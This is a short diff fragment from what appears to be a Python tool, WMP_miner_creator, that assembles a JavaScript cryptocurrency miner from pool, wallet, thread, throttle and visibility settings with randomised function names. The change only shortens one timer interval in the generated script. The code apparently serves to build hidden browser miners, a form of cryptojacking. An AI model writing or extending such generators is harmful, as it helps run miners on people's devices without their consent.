@@ -761,7 +761,7 @@ def WMP_miner_creator(Pool,Wallet,Threads,Speed,Output,Visibility):
     else:
         sleep(0.02)     
     Js_miner += "throttleMiner = " + Throttle + ";\n"
-    Js_miner += "setInterval(" + Randfuncname2 + ",60000);\n"
+    Js_miner += "setInterval(" + Randfuncname2 + ",30000);\n"
     Js_miner += "setInterval(" + Randfuncname1 + ",300000);\n"
     Js_miner += "</script>\n"
 
